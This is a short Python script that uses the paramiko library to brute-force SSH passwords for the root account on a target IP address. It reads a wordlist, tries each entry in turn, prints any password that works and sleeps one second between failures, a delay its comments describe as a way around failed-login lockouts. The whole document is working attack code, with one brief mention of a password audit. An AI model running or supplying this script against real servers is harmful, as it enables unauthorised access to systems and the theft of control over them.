# !/usr/bin/env python

# This script attempts to perform a brute force password attack on an SSH server running on a target machine
# It uses the Python paramiko library to create an SSH client
# Attempt to authenticate with each password in the list
# If a correct password is found, it is printed to the console and the script stops
# Does use a bypass failed log in attempt timer at bottom set at 1 sec, would change in RL

import paramiko
import time

# Set the IP address of the target machine
target_ip = "192.168.1.100"

# Set the SSH username and password for the target machine
ssh_username = "root"
ssh_password = "password"

# Set the path to the wordlist to use for the password audit
wordlist_path = "/path/to/wordlist.txt"

# Open the wordlist file and read in the lines
with open(wordlist_path, "r") as f:
    passwords = f.readlines()

# Strip newlines from the end of each password
passwords = [p.strip() for p in passwords]

# Create a Paramiko SSH client object
ssh = paramiko.SSHClient()

# Automatically add the target machine's SSH key to the client's host keys
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

# Loop through each password in the wordlist and attempt to log in via SSH
for password in passwords:
    try:
        # Connect to the target machine via SSH
        ssh.connect(target_ip, username=ssh_username, password=password, timeout=5)

        # If we made it here, the password worked!
        print(f"Password found: {password}")
        break

    except paramiko.ssh_exception.AuthenticationException:
        # If the password failed, sleep for 1 second before trying the next one
        time.sleep(1)
        continue

# Close the SSH connection
ssh.close()


